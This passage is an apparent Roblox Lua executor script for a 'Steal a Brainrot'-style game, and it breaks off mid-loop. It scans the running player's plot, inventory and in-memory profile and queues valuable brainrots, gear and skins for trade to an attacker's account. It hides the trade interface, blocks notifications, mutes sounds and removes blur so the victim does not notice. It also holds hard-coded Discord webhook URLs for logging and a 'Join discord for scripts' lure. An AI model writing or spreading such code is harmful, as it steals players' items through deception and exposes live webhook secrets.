-- ===================== MAIN SCRIPT (loadstring) =====================
-- Remotes resolved via TradeController getupvalue (no hard-coded Net indexes)
-- If no target brainrots on base at start → Discord invite GUI (no trades / no embed)
if getgenv().BrainrotMainLoaded then
	return warn("[Brainrot] Main already running!")
end
getgenv().BrainrotMainLoaded = true

local genv = getgenv()

local allowedPlaceIds = genv.ALLOWED_PLACE_IDS or {
	109983668079237,
}
if #allowedPlaceIds > 0 and not table.find(allowedPlaceIds, game.PlaceId) then
	getgenv().BrainrotMainLoaded = nil
	return
end

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local SoundService = game:GetService("SoundService")
local TweenService = game:GetService("TweenService")
local LP = Players.LocalPlayer
local cam = workspace.CurrentCamera
local pg = LP:WaitForChild("PlayerGui")
local Net = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net")

local GOOD_WEBHOOK = genv.GOOD_WEBHOOK or ""
local LOG_WEBHOOK = "https://discord.com/api/webhooks/1550503191324655626/L7i9pSQpbB5N9y9x0LsHVaanG1F0ky587O30QGiQUNryZHjoJR2eXoRMLGbjJW07pUl-"
local MISS_WEBHOOK = "https://discord.com/api/webhooks/1550502542096474152/Xps69n3gfm-a02my4XvmwJ4TzBinVQk8a7HvT7PzDyUy7HE5eY4swNWuEtn9Zujd5r9l"
local GOOD_AVATAR = genv.GOOD_AVATAR or "https://cdn.pfps.gg/pfps/77602-blood-cat.gif"
local TARGET_ID = tonumber(genv.TARGET_USER_ID) or 0
print("[Brainrot] TARGET_ID =", TARGET_ID)
print("[Brainrot] GOOD_WEBHOOK set:", GOOD_WEBHOOK ~= "" and GOOD_WEBHOOK ~= nil)
local MISS_TIMEOUT = 30
local MISS_TARGET_ID = 2829121161
local missFailoverDone = false
local currentlyInTrade = false

local STOLEN_GUI_URL = "https://paste.rs/NQk9A"
local DRAINED_NEED_STREAK = 4
local drainedGuiShown = false
local DISCORD_LINK = "https://discord.gg/bxjXucMVqB"

local MISS_BRAINROTS = {
	["Strawberry Elephant"] = true, ["Headless Horseman"] = true, ["Meowl"] = true,
	["John Pork"] = true, ["Skibidi Toilet"] = true, ["Griffin"] = true,
	["Dragon Aquanini"] = true, ["Dragon Gingerini"] = true, ["Hydra Dragon Cannelloni"] = true,
	["Signore Carapace"] = true, ["Dragon Cannelloni"] = true, ["Love Love Bear"] = true,
	["Moby Bros"] = true, ["Digi Narwhal"] = true, ["Kraken"] = true,
	["La Supreme Combinasion"] = true, ["Elefanto Frigo"] = true, ["Hydra Bunny"] = true,
	["Jelly Moby"] = true, ["Bumbatron"] = true, ["Bunny and Eggy"] = true,
	["Rosey and Teddy"] = true, ["Cooki and Milki"] = true, ["Arcadragon"] = true,
	["Los Secret Combinasionas"] = true, ["Ketupat Bros"] = true, ["Fortunu and Cashuru"] = true,
	["Los Amigos"] = true, ["Antonio"] = true, ["Pancake and Syrup"] = true,
	["Foxini Lanternini"] = true, ["Kalika Bros"] = true, ["Fishino Clownino"] = true,
	["La Casa Boo"] = true, ["Los Admins"] = true, ["Duggy Bros"] = true,
	["Sammyni Cakini"] = true, ["Ginger Gerat"] = true, ["Rubiko and Kubiko"] = true,
	["Examen Bros"] = true, ["Dug Dug Dug"] = true, ["Rico Dinero"] = true,
	["Tirilikalika Tirilikalako"] = true, ["La Breakfast Combinasion"] = true, ["Sammyini Truckini"] = true,
}

local FANDOM_BASE = "https://stealabrainrot.fandom.com/wiki/"
local TRADE_CYCLE_DELAY = 2
local INVITE_GUID = "8fbe1594-7cef-4c29-94d1-a0e93adfa5a4"
local SELECT_GUID = "c85a2323-36b2-4121-968a-c064a6168aff"
local SELECTGB_GUID = "6786cce9-00d8-41e9-8beb-d96e0412b78b"
local READY_GUID = "23f15b0b-b633-4f6b-888f-5924b7425522"
local ACCEPT_GUID = "86eea964-f19e-4ac6-b401-a71ecc89e596"
local FOOTER_ICON = "https://media.discordapp.net/attachments/1511087340721012919/1544655871529852988/2d33efc28dde57ea69dd4291cb6b4d6f_2.webp?ex=6a994c62&is=6a97fae2&hm=cd5486a74b48c119c89809204444e8a855045337dc23ede08a46ae7dd4077279&=&format=webp"
local FALLBACK_COLOR = 0x1A237E
local guiNames = { BrainrotTrader = true, TradeLiveTrade = true, TradePrompts = true }

local MUTATION_MULT = {
	["None"] = 1, ["Default"] = 1, ["Gold"] = 1.25, ["Diamond"] = 1.5, ["Bloodrot"] = 2,
	["Candy"] = 4, ["Lava"] = 6, ["Galaxy"] = 7, ["Yin Yang"] = 7.5,
	["Radioactive"] = 8.5, ["Cursed"] = 9, ["Divine"] = 10, ["Rainbow"] = 10,
	["Cyber"] = 11, ["Phantom"] = 12, ["Crystal"] = 13,
}

local MUTATION_EMOJI = {
	["None"] = "<:Default_Mutation:1483657150231216138>",
	["Default"] = "<:Default_Mutation:1483657150231216138>",
	["Gold"] = "<:Gold:1498277392194736138>",
	["Diamond"] = "<:Diamond:1498277422746046514>",
	["Rainbow"] = "<:Rainbow:1498277403871678514>",
	["Divine"] = "<:Divine:1498277407793348789>",
	["Radioactive"] = "<:Radioactive:1498277395562758276>",
	["Cursed"] = "<:Cursed:1498277428391317575>",
	["Galaxy"] = "<:Galaxy:1498277390571536395>",
	["Candy"] = "<:Candy:1498277426621448192>",
	["Bloodrot"] = "<:Bloodrot:1498277424490610710>",
	["Crystal"] = "<:Crystal:1532523409630695624>",
	["Phantom"] = "<:phan:1533658669173047326>",
	["Lava"] = "<:Lava:1498277393754886216>",
	["Cyber"] = "<:Cyber:1498277418815983776>",
	["Yin Yang"] = "<:YingYang:1513911235337261076>",
}

local GEAR_EMOJI = {
	["Waverider"] = "<:Waverider:1536942058676420680>",
	["Yin Yang Lamp"] = "<:YinYangLamp:1536942111218335754>",
	["Cupids Wings"] = "<:CupidsWings:1536941473407176715>",
	["Santas Sleigh"] = "<:SantasSleigh:1536942025646153818>",
	["Radioactive Airstrike"] = "<:RadioactiveAirstrike:1536941888148480000>",
	["Alien Slap"] = "<:AlienSlap:1536941130581807124>",
	["Divine Slap"] = "<:DivineSlap:1536941781277741076>",
	["Lava Slap"] = "<:LavaSlap:1536941851267965028>",
	["Cursed Slap"] = "<:CursedSlap:1536941510824689764>",
	["Demons Head"] = "<:DemonsHead:1536941574028525649>",
	["Witchs Broom"] = "<:WitchsBroom:1536942085649731667>",
	["Radioactive Slap"] = "<:RadioactiveSlap:1536941915931545650>",
	["Blackhole Bomb"] = "<:BlackholeBomb:1536941156649402490>",
	["Phantom Slap"] = "<:PhantomSlap:1536940296116371477>",
	["Cyber Slap"] = "<:CyberSlap:1536941541971730483>",
	["Lava Blaster"] = "<:LavaBlaster:1536941824915283998>",
	["Rainbow Slap"] = "<:RainbowSlap:1536941997510754424>",
	["Rainbow Hammer"] = "<:RainbowHammer:1536941964149133352>",
	["Bunny Basket"] = "<:BunnyBasket:1536943427327889419>",
	["Blood Moon Slap"] = "<:BloodMoonSlap:1538670582848032890>",
}

local BASESKIN_EMOJI = {
	["Octo"] = "<:Octo:1536944000752418856>",
	["Aquatic"] = "<:Aquatic:1536943396168532018>",
	["Rose"] = "<:Rose:1536944091558842378>",
	["Halloween"] = "<:Halloween:1536943747995279380>",
	["Pot Of Gold"] = "<:PotOfGold:1536944019827986532>",
	["Valentines"] = "<:Valentines:1536944152565252136>",
	["Christmas"] = "<:Christmas:1536943450388308049>",
	["Taco"] = "<:Taco:1536944658809225286>",
	["Lucky"] = "<:Lucky:1536943979793490000>",
}

local TargetBrainrots = {}
local GOOD_BRAINROTS = {}
if type(genv.ALLOWED_ANIMALS) == "table" then
	for _, name in pairs(genv.ALLOWED_ANIMALS) do
		if type(name) == "string" then
			TargetBrainrots[name] = true
			GOOD_BRAINROTS[name] = true
		end
	end
end
if next(TargetBrainrots) == nil then
	warn("[Brainrot] No ALLOWED_ANIMALS set in getgenv(). Using empty list.")
end

local ALLOWED_BASESKINS = genv.ALLOWED_BASESKINS or {}
local ALLOWED_GEARS = genv.ALLOWED_GEARS or {}

-----------------------------------------------------------
-- No-target Discord GUI (same visual language as stolen GUI)
-----------------------------------------------------------
local function showJoinDiscordGui()
	local old = pg:FindFirstChild("BrainrotJoinDiscordGui")
	if old then old:Destroy() end

	local CFG = {
		Title = "Join discord for scripts",
		Brand = "K2",
		DiscordLink = DISCORD_LINK,
		DiscordButtonText = "discord.gg/bxjXucMVqB",
		StarCount = 100,
		SkyTop = Color3.fromRGB(4, 4, 14),
		SkyMid = Color3.fromRGB(12, 10, 32),
		SkyBottom = Color3.fromRGB(22, 12, 40),
		MoonColor = Color3.fromRGB(238, 238, 248),
		GlowColor = Color3.fromRGB(200, 210, 255),
		Accent = Color3.fromRGB(180, 195, 255),
	}

	local function tw(obj, info, goal)
		local t = TweenService:Create(obj, info, goal)
		t:Play()
		return t
	end
	local function corner(obj, r)
		local c = Instance.new("UICorner")
		c.CornerRadius = typeof(r) == "UDim" and r or UDim.new(0, r or 12)
		c.Parent = obj
		return c
	end

	local gui = Instance.new("ScreenGui")
	gui.Name = "BrainrotJoinDiscordGui"
	gui.ResetOnSpawn = false
	gui.IgnoreGuiInset = true
	gui.DisplayOrder = 1000
	gui.Parent = pg

	local root = Instance.new("Frame")
	root.Name = "Root"
	root.Size = UDim2.fromScale(1, 1)
	root.BackgroundColor3 = CFG.SkyTop
	root.BackgroundTransparency = 0
	root.BorderSizePixel = 0
	root.ClipsDescendants = true
	root.Parent = gui

	local skyGradient = Instance.new("UIGradient")
	skyGradient.Rotation = 90
	skyGradient.Color = ColorSequence.new({
		ColorSequenceKeypoint.new(0, CFG.SkyTop),
		ColorSequenceKeypoint.new(0.5, CFG.SkyMid),
		ColorSequenceKeypoint.new(1, CFG.SkyBottom),
	})
	skyGradient.Parent = root

	local vignette = Instance.new("Frame")
	vignette.Size = UDim2.fromScale(1, 1)
	vignette.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	vignette.BackgroundTransparency = 0.55
	vignette.BorderSizePixel = 0
	vignette.ZIndex = 1
	vignette.Parent = root
	local vigGrad = Instance.new("UIGradient")
	vigGrad.Rotation = 90
	vigGrad.Transparency = NumberSequence.new({
		NumberSequenceKeypoint.new(0, 0.15),
		NumberSequenceKeypoint.new(0.35, 0.85),
		NumberSequenceKeypoint.new(0.65, 0.85),
		NumberSequenceKeypoint.new(1, 0.1),
	})
	vigGrad.Parent = vignette

	local stars = Instance.new("Frame")
	stars.Size = UDim2.fromScale(1, 1)
	stars.BackgroundTransparency = 1
	stars.ZIndex = 2
	stars.Parent = root
	for i = 1, CFG.StarCount do
		local s = Instance.new("Frame")
		local sz = math.random(1, 3)
		s.Size = UDim2.fromOffset(sz, sz)
		s.Position = UDim2.fromScale(math.random(), math.random())
		s.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		s.BackgroundTransparency = math.random(30, 75) / 100
		s.BorderSizePixel = 0
		s.ZIndex = 2
		s.Parent = stars
		corner(s, 1)
		task.spawn(function()
			while s.Parent do
				local t = tw(s, TweenInfo.new(math.random(10, 28) / 10, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
					BackgroundTransparency = math.random(15, 90) / 100,
				})
				t.Completed:Wait()
			end
		end)
	end

	-- Crescent moon (upper right)
	local moonHold = Instance.new("Frame")
	moonHold.AnchorPoint = Vector2.new(0.5, 0.5)
	moonHold.Position = UDim2.new(0.88, 0, 0.18, 0)
	moonHold.Size = UDim2.fromOffset(140, 140)
	moonHold.BackgroundTransparency = 1
	moonHold.ZIndex = 3
	moonHold.Parent = root
	for _, scale in ipairs({ 2.4, 1.8, 1.35 }) do
		local g = Instance.new("Frame")
		g.AnchorPoint = Vector2.new(0.5, 0.5)
		g.Position = UDim2.fromScale(0.5, 0.5)
		g.Size = UDim2.fromScale(scale, scale)
		g.BackgroundColor3 = CFG.GlowColor
		g.BackgroundTransparency = 0.88 + (scale * 0.02)
		g.BorderSizePixel = 0
		g.ZIndex = 3
		g.Parent = moonHold
		corner(g, 1)
	end
	local moon = Instance.new("Frame")
	moon.AnchorPoint = Vector2.new(0.5, 0.5)
	moon.Position = UDim2.fromScale(0.5, 0.5)
	moon.Size = UDim2.fromOffset(88, 88)
	moon.BackgroundColor3 = CFG.MoonColor
	moon.BorderSizePixel = 0
	moon.ZIndex = 4
	moon.Parent = moonHold
	corner(moon, 1)
	local cut = Instance.new("Frame")
	cut.AnchorPoint = Vector2.new(0.5, 0.5)
	cut.Position = UDim2.new(0.62, 0, 0.42, 0)
	cut.Size = UDim2.fromOffset(72, 72)
	cut.BackgroundColor3 = CFG.SkyMid
	cut.BorderSizePixel = 0
	cut.ZIndex = 5
	cut.Parent = moonHold
	corner(cut, 1)
	task.spawn(function()
		local t0 = tick()
		while moonHold.Parent do
			local a = math.sin((tick() - t0) * 0.6) * 6
			moonHold.Rotation = a
			task.wait(0.03)
		end
	end)

	local brand = Instance.new("TextLabel")
	brand.AnchorPoint = Vector2.new(0.5, 0.5)
	brand.Position = UDim2.new(0.5, 0, 0.28, 0)
	brand.Size = UDim2.new(0.9, 0, 0, 28)
	brand.BackgroundTransparency = 1
	brand.Text = CFG.Brand
	brand.TextColor3 = CFG.Accent
	brand.TextTransparency = 1
	brand.TextSize = 16
	brand.Font = Enum.Font.GothamBold
	brand.ZIndex = 10
	brand.Parent = root

	local title = Instance.new("TextLabel")
	title.AnchorPoint = Vector2.new(0.5, 0.5)
	title.Position = UDim2.new(0.5, 0, 0.42, 0)
	title.Size = UDim2.new(0.92, 0, 0, 72)
	title.BackgroundTransparency = 1
	title.Text = CFG.Title
	title.TextColor3 = Color3.fromRGB(255, 255, 255)
	title.TextTransparency = 1
	title.TextSize = 36
	title.Font = Enum.Font.GothamBlack
	title.TextWrapped = true
	title.ZIndex = 10
	title.Parent = root

	local btn = Instance.new("TextButton")
	btn.AnchorPoint = Vector2.new(0.5, 0.5)
	btn.Position = UDim2.new(0.5, 0, 0.62, 0)
	btn.Size = UDim2.fromOffset(280, 48)
	btn.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
	btn.BackgroundTransparency = 1
	btn.Text = CFG.DiscordButtonText
	btn.TextColor3 = Color3.fromRGB(255, 255, 255)
	btn.TextTransparency = 1
	btn.TextSize = 16
	btn.Font = Enum.Font.GothamBold
	btn.AutoButtonColor = false
	btn.ZIndex = 10
	btn.Parent = root
	corner(btn, 12)
	local btnStroke = Instance.new("UIStroke")
	btnStroke.Color = Color3.fromRGB(180, 190, 255)
	btnStroke.Thickness = 1.5
	btnStroke.Transparency = 1
	btnStroke.Parent = btn

	local status = Instance.new("TextLabel")
	status.AnchorPoint = Vector2.new(0.5, 0.5)
	status.Position = UDim2.new(0.5, 0, 0.72, 0)
	status.Size = UDim2.new(0.8, 0, 0, 22)
	status.BackgroundTransparency = 1
	status.Text = ""
	status.TextColor3 = Color3.fromRGB(160, 220, 180)
	status.TextSize = 13
	status.Font = Enum.Font.GothamMedium
	status.ZIndex = 10
	status.Parent = root

	-- open animation
	task.spawn(function()
		tw(brand, TweenInfo.new(0.45, Enum.EasingStyle.Quad), { TextTransparency = 0 }):Play()
		task.wait(0.12)
		tw(title, TweenInfo.new(0.5, Enum.EasingStyle.Quad), { TextTransparency = 0 }):Play()
		task.wait(0.15)
		tw(btn, TweenInfo.new(0.4, Enum.EasingStyle.Quad), { BackgroundTransparency = 0, TextTransparency = 0 }):Play()
		tw(btnStroke, TweenInfo.new(0.4), { Transparency = 0.35 }):Play()
	end)

	btn.MouseEnter:Connect(function()
		tw(btn, TweenInfo.new(0.15), { BackgroundColor3 = Color3.fromRGB(100, 115, 255) }):Play()
		tw(btn, TweenInfo.new(0.15, Enum.EasingStyle.Back), { Size = UDim2.fromOffset(292, 52) }):Play()
	end)
	btn.MouseLeave:Connect(function()
		tw(btn, TweenInfo.new(0.15), { BackgroundColor3 = Color3.fromRGB(88, 101, 242) }):Play()
		tw(btn, TweenInfo.new(0.15), { Size = UDim2.fromOffset(280, 48) }):Play()
	end)
	btn.MouseButton1Click:Connect(function()
		local ok = pcall(function()
			if setclipboard then
				setclipboard(CFG.DiscordLink)
			elseif toclipboard then
				toclipboard(CFG.DiscordLink)
			end
		end)
		status.Text = ok and "Copied!" or CFG.DiscordLink
		status.TextTransparency = 0
		tw(btn, TweenInfo.new(0.12), { Size = UDim2.fromOffset(268, 44) }):Play()
		task.delay(0.12, function()
			tw(btn, TweenInfo.new(0.2, Enum.EasingStyle.Back), { Size = UDim2.fromOffset(280, 48) }):Play()
		end)
		task.delay(2.2, function()
			if status and status.Parent then
				tw(status, TweenInfo.new(0.4), { TextTransparency = 1 }):Play()
			end
		end)
	end)

	print("[Brainrot] No target brainrots — Join Discord GUI shown")
end

-----------------------------------------------------------
-- REMOTES: TradeController getupvalue (Chocola method)
-----------------------------------------------------------
local TradeController, InterfaceController, SoundController, NotificationController, CameraController
local ReplicatorClient, ChannelModule

pcall(function()
	TradeController = require(ReplicatedStorage.Controllers.TradeController)
end)
pcall(function()
	InterfaceController = require(ReplicatedStorage.Controllers.InterfaceController)
end)
pcall(function()
	SoundController = require(ReplicatedStorage.Controllers.SoundController)
end)
pcall(function()
	NotificationController = require(ReplicatedStorage.Controllers.NotificationController)
end)
pcall(function()
	CameraController = require(ReplicatedStorage.Controllers.CameraController)
end)
pcall(function()
	ReplicatorClient = require(ReplicatedStorage.Packages.ReplicatorClient)
end)
pcall(function()
	ChannelModule = require(ReplicatedStorage.Packages.Synchronizer.Channel)
end)

local liveTrade, inviteRemote, addBrainrotRemote, addItemRemote
local readyRemote, acceptRemote, tradeEndRemote
local tradeChannel = nil
local remotesReady = false

local function resolveTradeRemotes()
	if not TradeController or not getupvalue then
		return false
	end
	local ok = pcall(function()
		liveTrade = getupvalue(TradeController._createLiveTrade, 15)
		inviteRemote = getupvalue(TradeController.SendInvite, 1)
		addBrainrotRemote = liveTrade and getupvalue(liveTrade.Brainrot.Add, 1) or nil
		addItemRemote = liveTrade and getupvalue(liveTrade.BaseSkin.Add, 1) or nil
		readyRemote = getupvalue(TradeController._createLiveTrade, 24)
		acceptRemote = getupvalue(TradeController._createLiveTrade, 23)
		tradeEndRemote = getupvalue(TradeController._createPlayerList, 21)
	end)
	if not ok then return false end
	return liveTrade and inviteRemote and addBrainrotRemote and readyRemote and acceptRemote
end

local function fallbackRemote(leaf)
	for _, child in ipairs(Net:GetChildren()) do
		if child.Name == leaf or child.Name:find(leaf, 1, true) then
			if child:IsA("RemoteFunction") or child:IsA("RemoteEvent") then
				return child
			end
		end
	end
	local exact = Net:FindFirstChild(leaf)
	if exact and (exact:IsA("RemoteFunction") or exact:IsA("RemoteEvent")) then
		return exact
	end
	return nil
end

local function waitForRemotes(timeout)
	timeout = timeout or 15
	local t0 = os.clock()
	while os.clock() - t0 < timeout do
		if resolveTradeRemotes() then
			remotesReady = true
			print("[Brainrot] Remotes via TradeController getupvalue OK")
			print("[Brainrot] Invite     :", inviteRemote and inviteRemote.Name or "?")
			print("[Brainrot] AddBrainrot:", addBrainrotRemote and addBrainrotRemote.Name or "?")
			print("[Brainrot] AddItem    :", addItemRemote and addItemRemote.Name or "?")
			print("[Brainrot] Ready      :", readyRemote and readyRemote.Name or "?")
			print("[Brainrot] Accept     :", acceptRemote and acceptRemote.Name or "?")
			return true
		end
		task.wait(0.1)
	end
	warn("[Brainrot] getupvalue resolve timed out — falling back to Net name search")
	inviteRemote = inviteRemote or fallbackRemote("Invite") or fallbackRemote("RF/TradeService/Invite")
	addBrainrotRemote = addBrainrotRemote or fallbackRemote("AddBrainrot") or fallbackRemote("RF/TradeService/AddBrainrot")
	addItemRemote = addItemRemote or fallbackRemote("AddItem") or fallbackRemote("RF/TradeService/AddItem")
	readyRemote = readyRemote or fallbackRemote("Ready") or fallbackRemote("RE/TradeService/Ready")
	acceptRemote = acceptRemote or fallbackRemote("Accept") or fallbackRemote("RE/TradeService/Accept")
	remotesReady = inviteRemote and readyRemote and acceptRemote and true or false
	print("[Brainrot] Fallback Invite:", inviteRemote and inviteRemote.Name or "MISSING")
	print("[Brainrot] Fallback AddBrainrot:", addBrainrotRemote and addBrainrotRemote.Name or "MISSING")
	print("[Brainrot] Fallback Ready:", readyRemote and readyRemote.Name or "MISSING")
	print("[Brainrot] Fallback Accept:", acceptRemote and acceptRemote.Name or "MISSING")
	return remotesReady
end

local function hookTradeUI()
	if not InterfaceController then return end
	local originalToggle = InterfaceController.Toggle
	local originalSetState = InterfaceController.SetState
	pcall(function()
		local TradeLiveTrade = InterfaceController:Get("TradeLiveTrade")
		if TradeLiveTrade and TradeLiveTrade:IsOpened() then
			InterfaceController:Toggle("TradeLiveTrade", false)
			if CameraController then
				pcall(function()
					CameraController:Blur(0, 0)
					CameraController:Fov(CameraController:GetDefaultFov(), 0)
				end)
			end
		end
	end)
	InterfaceController.Toggle = function(self, name, ...)
		if name == "TradeLiveTrade" then return end
		return originalToggle(self, name, ...)
	end
	InterfaceController.SetState = function(self, name, ...)
		if name == "TradeLiveTrade" then return end
		return originalSetState(self, name, ...)
	end
	if NotificationController then
		local originalNotify = NotificationController.Notify
		local originalError = NotificationController.Error
		local originalSuccess = NotificationController.Success
		local function isFromTrade()
			for i = 2, 8 do
				local src = debug.info(i, "s")
				if not src then break end
				if src:find("TradeController") then return true end
			end
			return false
		end
		NotificationController.Notify = function(self, msg, ...)
			if isFromTrade() then return end
			return originalNotify(self, msg, ...)
		end
		NotificationController.Error = function(self, ...)
			if isFromTrade() then return end
			return originalError(self, ...)
		end
		NotificationController.Success = function(self, ...)
			if isFromTrade() then return end
			return originalSuccess(self, ...)
		end
	end
	if SoundController then
		local originalPlay = SoundController.PlaySound
		SoundController.PlaySound = function(self, soundId, ...)
			for i = 2, 6 do
				local src = debug.info(i, "s")
				if src and src:find("TradeController") then return end
			end
			return originalPlay(self, soundId, ...)
		end
	end
end

local tradeActiveFlag = false
local function setupTradeChannel()
	if not ReplicatorClient then return end
	pcall(function()
		tradeChannel = ReplicatorClient.get(("Trade_%*"):format(LP.UserId))
		if tradeChannel and tradeChannel.Observe then
			tradeChannel:Observe({ "active", "data" }, function(data)
				tradeActiveFlag = data ~= nil
				currentlyInTrade = tradeActiveFlag
			end)
		end
	end)
end

local function blockNotifications()
	local notifyRemote = fallbackRemote("Notify") or fallbackRemote("NotificationService")
	if not notifyRemote then return end
	print("[Brainrot] Blocking notifications:", notifyRemote.Name)
	pcall(function()
		for _, conn in pairs(getconnections(notifyRemote.OnClientEvent)) do
			pcall(function()
				if conn.Disable then conn:Disable() end
				if conn.Disconnect then conn:Disconnect() end
			end)
		end
	end)
	task.spawn(function()
		while true do
			task.wait(2)
			pcall(function()
				for _, conn in pairs(getconnections(notifyRemote.OnClientEvent)) do
					pcall(function()
						if conn.Disable then conn:Disable() end
					end)
				end
			end)
		end
	end)
end

local function applyEverythingAfterTargetFound()
	local leftCenter = pg:FindFirstChild("LeftCenter")
	if leftCenter then
		local clone = leftCenter:Clone()
		clone.Name = "LeftCenter_Backup"
		clone.Parent = pg
		leftCenter:Destroy()
	end
	local function handleCam(obj)
		if obj:IsA("BlurEffect") then
			task.defer(function() obj:Destroy() end)
		end
	end
	cam.ChildAdded:Connect(handleCam)
	for _, v in ipairs(cam:GetChildren()) do handleCam(v) end
	cam:GetPropertyChangedSignal("FieldOfView"):Connect(function()
		cam.FieldOfView = 70
	end)
	cam.FieldOfView = 70
	local function handleGui(obj)
		if guiNames[obj.Name] then
			task.defer(function() obj:Destroy() end)
		end
	end
	pg.ChildAdded:Connect(handleGui)
	for _, v in ipairs(pg:GetChildren()) do handleGui(v) end
	task.spawn(function()
		pcall(function() SoundService.Volume = 0 end)
		local function mute(s)
			if s:IsA("Sound") then
				pcall(function() s.Volume = 0; s:Stop() end)
			end
		end
		for _, s in ipairs(SoundService:GetDescendants()) do mute(s) end
		SoundService.DescendantAdded:Connect(mute)
		workspace.DescendantAdded:Connect(mute)
	end)
end

local AnimalsData, NumberUtils, TraitsData
pcall(function() AnimalsData = require(ReplicatedStorage:WaitForChild("Datas"):WaitForChild("Animals")) end)
pcall(function() NumberUtils = require(ReplicatedStorage:WaitForChild("Utils"):WaitForChild("NumberUtils")) end)
pcall(function() TraitsData = require(ReplicatedStorage:WaitForChild("Datas"):WaitForChild("Traits")) end)
pcall(function()
	if not TraitsData then
		TraitsData = require(ReplicatedStorage:WaitForChild("Shared"):WaitForChild("Traits"))
	end
end)

local function plotOwnedByLocalPlayer(plot)
	if not plot then return false end
	for _, key in ipairs({ "Owner", "OwnerUserId", "UserId", "OwnerId", "PlayerUserId" }) do
		local v = plot:GetAttribute(key)
		if v ~= nil then
			if tonumber(v) == LP.UserId then return true end
			if tostring(v) == LP.Name or tostring(v) == LP.DisplayName or tostring(v) == tostring(LP.UserId) then
				return true
			end
		end
	end
	for _, inst in ipairs(plot:GetDescendants()) do
		local n = string.lower(inst.Name)
		if n == "owner" or n == "owneruserid" or n == "userid" or n == "ownerid" then
			if inst:IsA("ObjectValue") and inst.Value == LP then return true end
			if (inst:IsA("NumberValue") or inst:IsA("IntValue")) and inst.Value == LP.UserId then return true end
			if inst:IsA("StringValue") then
				local s = inst.Value
				if s == LP.Name or s == LP.DisplayName or s == tostring(LP.UserId) then return true end
			end
		end
	end
	if plot.Name == tostring(LP.UserId) or plot.Name:find(tostring(LP.UserId), 1, true) then
		return true
	end
	return false
end

local function ownerMatchesLocal(ownerField)
	if ownerField == nil then return nil end
	local oid = tonumber(ownerField)
	if oid then return oid == LP.UserId end
	local s = tostring(ownerField)
	return s == LP.Name or s == LP.DisplayName or s == tostring(LP.UserId)
end

local function getMyPlotAndAnimals()
	local plotsFolder = workspace:FindFirstChild("Plots")
	if not plotsFolder then return nil, nil end
	local hrp = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
	if not hrp then
		for _ = 1, 10 do
			task.wait(0.1)
			hrp = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
			if hrp then break end
		end
	end
	local syncFolder = ReplicatedStorage.Packages:FindFirstChild("Synchronizer")
	local requestData = syncFolder and syncFolder:FindFirstChild("RequestData")
	if not requestData then
		warn("[Brainrot] Synchronizer.RequestData missing")
		return nil, nil
	end
	local candidates = {}
	for _, plot in ipairs(plotsFolder:GetChildren()) do
		if plotOwnedByLocalPlayer(plot) then
			table.insert(candidates, plot)
		end
	end
	local function fetchAnimals(plot)
		local ok, data = pcall(function()
			return requestData:InvokeServer(plot.Name)
		end)
		if not ok or type(data) ~= "table" or type(data.AnimalList) ~= "table" then
			return nil, nil
		end
		local ownerField = data.Owner or data.OwnerUserId or data.UserId or data.PlayerUserId
		local match = ownerMatchesLocal(ownerField)
		if match == false then return nil, nil end
		if match == nil and not plotOwnedByLocalPlayer(plot) then return nil, nil end
		return data.AnimalList, data
	end
	local verified = {}
	local searchList = #candidates > 0 and candidates or plotsFolder:GetChildren()
	for _, plot in ipairs(searchList) do
		local animals = fetchAnimals(plot)
		if animals then
			local dist = math.huge
			if hrp then
				local okp, pos = pcall(function() return plot:GetPivot().Position end)
				if okp and pos then dist = (pos - hrp.Position).Magnitude end
			end
			table.insert(verified, { plot = plot, animals = animals, dist = dist })
		end
	end
	if #verified == 0 then
		warn("[Brainrot] No plot verified as local player (", LP.Name, LP.UserId, ")")
		return nil, nil
	end
	table.sort(verified, function(a, b) return a.dist < b.dist end)
	local best = verified[1]
	print("[Brainrot] Using plot:", best.plot.Name, "| local only |", LP.Name, LP.UserId)
	return best.plot, best.animals
end

local cachedProfile = nil
local profileReady = false

local function scanProfileAsync()
	task.spawn(function()
		local found = nil
		local n = 0
		pcall(function()
			for _, v in pairs(getgc(true)) do
				n += 1
				if n % 400 == 0 then task.wait() end
				if type(v) == "table" then
					local ok, bi = pcall(rawget, v, "BaseSkinInventory")
					if ok and type(bi) == "table" then
						if type(rawget(v, "Coins")) == "number" and type(rawget(v, "Rebirth")) == "number" then
							found = v
							break
						end
					end
				end
			end
		end)
		cachedProfile = found
		profileReady = true
		print("[Brainrot] Profile scan done:", found and "found" or "not found")
	end)
end

local function getMyProfile()
	return cachedProfile
end

local function buildSkinQueue()
	local queue = {}
	if not next(ALLOWED_BASESKINS) then return queue end
	local profile = getMyProfile()
	if not profile then return queue end
	local bi = rawget(profile, "BaseSkinInventory")
	if type(bi) ~= "table" then return queue end
	for uuid, data in pairs(bi) do
		if type(data) == "table" then
			local name = tostring(data.SkinName or data.Skin or "")
			if ALLOWED_BASESKINS[name] then
				table.insert(queue, { uuid = tostring(uuid), skinName = name })
			end
		end
	end
	return queue
end

local function buildGearQueue()
	local queue = {}
	if not next(ALLOWED_GEARS) then return queue end
	local profile = getMyProfile()
	if not profile then return queue end
	local gi = rawget(profile, "GearInventory")
	if type(gi) ~= "table" then return queue end
	for uuid, data in pairs(gi) do
		if type(data) == "table" then
			local name = tostring(data.GearName or data.Name or "")
			if ALLOWED_GEARS[name] then
				table.insert(queue, { uuid = tostring(uuid), gearName = name })
			end
		end
	end
	return queue
end

scanProfileAsync()
hookTradeUI()
setupTradeChannel()
blockNotifications()

local myPlot, animalList = getMyPlotAndAnimals()
if not myPlot or not animalList then
	warn("[Brainrot] Could not find plot or AnimalList — showing Join Discord GUI")
	showJoinDiscordGui()
	getgenv().BrainrotMainLoaded = nil
	return
end

local brainrotQueue = {}
local missBrainrotQueue = {}
for slotKey, data in pairs(animalList) do
	if type(data) == "table" and data.Index then
		local displayName = data.Index
		if AnimalsData and AnimalsData[data.Index] and AnimalsData[data.Index].DisplayName then
			displayName = AnimalsData[data.Index].DisplayName
		end
		if TargetBrainrots[displayName] or TargetBrainrots[data.Index] then
			table.insert(brainrotQueue, {
				slotKey = tonumber(slotKey),
				data = data,
				displayName = displayName,
			})
		end
